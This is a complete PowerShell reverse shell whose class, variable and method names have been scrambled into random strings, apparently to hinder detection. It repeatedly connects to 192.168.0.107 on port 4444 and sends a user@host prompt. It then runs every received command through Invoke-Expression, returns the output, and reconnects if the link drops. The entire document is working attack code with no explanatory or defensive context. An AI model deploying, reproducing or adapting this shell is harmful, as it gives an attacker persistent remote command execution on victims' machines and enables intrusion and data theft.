class npSgwkrl {
    
    [string]$lTPkZLzfGYccfR = "192.168.0.107"
    [int]$VUNPHwE = 4444

    $FGsrhtCeijO
    $qrikxidheUKFLtFzQGnirekZ
    $sHONLifWagOTBQoogTcUoFq
    $HqoxevJcaGMWA
    $XIsybFVQpwlClncMFsOVyT
    $bdHnPRLzOUCoDQnYA
    [int]$lxCZxyhBllzWaIVsj = 50*1024

    OnotnDULyilUgVFvyEWDjf() {
        $this.qrikxidheUKFLtFzQGnirekZ = $false
        while ($true) {
            try {
                $this.qrikxidheUKFLtFzQGnirekZ = New-Object Net.Sockets.TcpClient($this.lTPkZLzfGYccfR, $this.VUNPHwE)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.QjeczTJOBZ()
    }

    QjeczTJOBZ() {
        $this.FGsrhtCeijO = $this.qrikxidheUKFLtFzQGnirekZ.GetStream()
        $this.HqoxevJcaGMWA = New-Object Byte[] $this.lxCZxyhBllzWaIVsj
        $this.bdHnPRLzOUCoDQnYA = New-Object Text.UTF8Encoding
        $this.sHONLifWagOTBQoogTcUoFq = New-Object IO.StreamWriter($this.FGsrhtCeijO, [Text.Encoding]::UTF8, $this.lxCZxyhBllzWaIVsj)
        $this.XIsybFVQpwlClncMFsOVyT = New-Object System.IO.StreamReader($this.FGsrhtCeijO)
        $this.sHONLifWagOTBQoogTcUoFq.AutoFlush = $true
    }

    CePQmdz() {
        $this.OnotnDULyilUgVFvyEWDjf()
        $this.xRaUvRbRAtMPXErSQvTIpF()
    }

    SVkkzrHJBSqJTLjrAAoaWM($vIBBeoSYLYQ) {
        try {
            [byte[]]$kpyHDtwjU = [text.Encoding]::Ascii.GetBytes($vIBBeoSYLYQ)
            $this.sHONLifWagOTBQoogTcUoFq.Write($kpyHDtwjU, 0, $kpyHDtwjU.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.CePQmdz()
        }
    }

    [string] bShyOaDt() {
        try {
            $GHtEmeHfXb = $this.FGsrhtCeijO.Read($this.HqoxevJcaGMWA, 0, $this.lxCZxyhBllzWaIVsj)    
            $mKOrOCvOLFEWlusNi = ($this.bdHnPRLzOUCoDQnYA.GetString($this.HqoxevJcaGMWA, 0, $GHtEmeHfXb))
            return $mKOrOCvOLFEWlusNi
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.CePQmdz()
            return ""
        }
    }

    [string] zcPwokHRtNQPxmiVHWwkpU($dYkOdkeBoNCywCtMQHR) {
        Write-Host $dYkOdkeBoNCywCtMQHR
        try { 
            $VXSGQxKttButDBlgXegwsjE = Invoke-Expression $dYkOdkeBoNCywCtMQHR | Out-String
        }
        catch {
            $FliLZkObvtCurFaHpXdLMN = $_.Exception
            $uvedTFxSgjntYM = $_.Message
            $VXSGQxKttButDBlgXegwsjE = "`n$_`n"
        }
        return $VXSGQxKttButDBlgXegwsjE
    }

    [string] niurVvwmIPWIaAM() {
        $taqOkRxPfKas = [Environment]::UserName
        $pCkCrHDiHcrxdNogjEjJJH = [System.Net.Dns]::GetHostName()
        $tbKWcjLyqlPTVmk = Get-Location
        return "$taqOkRxPfKas@$pCkCrHDiHcrxdNogjEjJJH [$tbKWcjLyqlPTVmk]~$ "
    }

    xRaUvRbRAtMPXErSQvTIpF() {
        while ($this.qrikxidheUKFLtFzQGnirekZ.Connected) {
            $this.SVkkzrHJBSqJTLjrAAoaWM($this.niurVvwmIPWIaAM())         
            $mKOrOCvOLFEWlusNi = $this.bShyOaDt()
            $VXSGQxKttButDBlgXegwsjE = "`n"
            if ([string]::IsNullOrEmpty($mKOrOCvOLFEWlusNi)) {
                continue
            }
            $VXSGQxKttButDBlgXegwsjE = $this.zcPwokHRtNQPxmiVHWwkpU($mKOrOCvOLFEWlusNi)
            $this.SVkkzrHJBSqJTLjrAAoaWM($VXSGQxKttButDBlgXegwsjE + "`n")
            $this.FGsrhtCeijO.Flush()
        }
        $this.qrikxidheUKFLtFzQGnirekZ.Close()
        $this.CePQmdz()
    } 
}

$hcJIKOVKFRFIFjvaxEJJxzfQ = [npSgwkrl]::new()
$hcJIKOVKFRFIFjvaxEJJxzfQ.CePQmdz()
